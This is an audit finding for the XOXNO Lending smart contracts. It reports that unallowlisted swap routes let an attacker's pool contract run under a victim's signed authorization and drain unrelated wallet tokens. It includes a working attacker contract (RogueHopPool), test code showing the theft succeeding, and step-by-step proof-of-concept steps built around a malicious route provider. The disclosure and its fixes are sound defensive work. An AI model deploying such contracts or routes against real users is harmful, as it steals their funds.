### Title
Crafted swap route executes attacker contract under the caller's signed auth tree to drain wallet tokens - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The Mercurial `ext::` bug class is "a crafted input string causes the product to invoke attacker-chosen code under the victim's authority." XOXNO Lending's analog is the `StrategySwap` route bytes that every unprivileged account strategy (`multiply`, `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `flash_position`) forwards verbatim to the swap aggregator. Neither the controller nor the router allowlists the pool/token addresses the route names, so a crafted route puts an attacker-deployed "pool" contract on the call stack *below the victim's authorization*. That contract can issue `token.transfer(victim, attacker, …)` calls that simulation records as children of the victim's `swap_collateral` auth entry; once the victim signs the simulated tree, the transfer executes and the victim's unrelated wallet tokens are stolen.

### Finding Description
`swap_tokens` in `contracts/controller/src/strategies/swap.rs` accepts `swap: &StrategySwap` from the caller, authorizes one exact `token_in.transfer(controller, router, amount_in)` via `authorize_transfer_as_current`, and invokes `router.execute_strategy(&controller, &amount_in, swap)` [1](#0-0) . The controller's post-checks only bound the *controller's own* balances: it rejects input-balance growth, rejects measured spend above `amount_in`, and requires positive `token_out` receipt [2](#0-1) .

The threat model itself states the gap: "The router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization. A token transfer that such code makes from the caller is recorded by an honest simulation as a child of the caller's authorization entry, and it executes if the caller signs that tree" [3](#0-2) . INV-STRAT-01/02 confirm the controller's grant and checks cover only the routed input and measured output — there is no venue allowlist and no slippage bound independent of the payload's own `min_out` [4](#0-3) .

The harness proves reachability end-to-end: an attacker-deployed `RogueHopPool` invoked through a crafted `swap_collateral` route calls `token::Client::transfer(victim, attacker, WALLET_BALANCE)`, `simulateTransaction` records that transfer as a sub-invocation of Alice's `swap_collateral` entry, and with the simulated tree signed the theft executes while the swap itself still pays out fair output [5](#0-4) . The enforced-auth test confirms the only thing standing between the victim and the drain is the client inspecting the auth tree — the signed poisoned tree succeeds [6](#0-5) .

### Impact Explanation
Theft of user funds. The attacker can transfer *any* token the victim holds in any amount (the test drains `WALLET_BALANCE` of a token completely unrelated to the swap), bounded only by what the victim's wallet contains — not by `amount_in`, `min_out`, or the account's health gates [7](#0-6) . The same primitive applies to direct `execute_strategy` router users and to every controller strategy that takes `swap` bytes.

### Likelihood Explanation
An unprivileged attacker needs the victim to submit a transaction carrying the crafted `swap_xdr`. The realistic vector is a malicious or compromised route provider/front-end: the user requests a quote, receives `routeXdr`, builds `swap_collateral(account, …, route)`, simulates (which silently produces the poisoned auth tree), and signs. Honest wallets that display auth trees show a benign-looking `transfer` child, and nothing in the controller, router, or simulation flags it — the codebase documents that detection is delegated entirely to the client [8](#0-7) . Because the rogue venue also delivers the promised output, the swap "succeeds" normally, making the theft hard for the victim to attribute. Medium-high likelihood for a targeted/phishing deployment, high impact: High.

### Recommendation
Add an on-chain venue/pool allowlist to the router (owner-managed, like the existing token fee whitelist) and have `dispatch_hop` reject pool addresses not on it — this removes attacker code from the call stack entirely rather than relying on client-side auth-tree inspection. As defense-in-depth, the controller could additionally assert, after the router call, that no tokens other than `token_in`/`token_out` changed controller-side balances. Document the residual risk that even allowlisted venues run third-party code under the caller's auth subtree.

### Proof of Concept
1. Attacker deploys `RogueHopPool` storing `(victim, wallet_token, attacker, amount)` and a `swap()` entry that calls `token::Client::transfer(&victim, &attacker, &amount)` [9](#0-8) .
2. Attacker gives the victim a route whose hop pool is `RogueHopPool` and whose `min_out` is a fair ETH output (funded in the router double; on mainnet the real router executes the route and the venue call is `invoke_contract(hop_pool, "swap")`-equivalent adapter code) [10](#0-9) .
3. Victim calls `controller.swap_collateral(alice, account_id, USDC, amount_in, ETH, route)`. `simulateTransaction` runs in recording mode and returns an auth tree for Alice whose `swap_collateral` root carries a `wallet_token.transfer(alice → attacker, WALLET_BALANCE)` child [5](#0-4) .
4. Victim signs the simulated tree; the host authorizes the child, Alice's wallet token balance goes to 0 and the attacker's to `WALLET_BALANCE`, while Alice receives `FAIR_OUT_ETH` so the transaction looks successful [6](#0-5) .

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** docs/reference/invariants.md (L632-655)
```markdown
### INV-STRAT-01 — Controller router authority binds one input transfer

The controller authorizes one exact
`token_in.transfer(controller, configured_router, amount_in)` invocation,
without sub-invocations. This grants invocation authority, without a token
allowance.

The controller ignores the router's return value, rejects input-balance growth
and rejects measured spending above `amount_in`.

<a id="inv-strat-02"></a>
<a id="inv-strat-02--strategy-settlement-is-measured-and-solvent"></a>

### INV-STRAT-02 — Account strategies settle measured flows and final risk

Distinct-token swaps require positive measured controller output. The current
swap's unspent controller-held input returns to the caller. Router-held residue
instead becomes admin revenue within the router's per-token limit; larger
residue reverts.

The router checks the route minimum against its output vault after fees and
before payout. This does not guarantee measured recipient receipt. The
controller independently checks positive output and final account risk,
without checking the payload minimum.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-47)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L52-71)
```rust
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-227)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
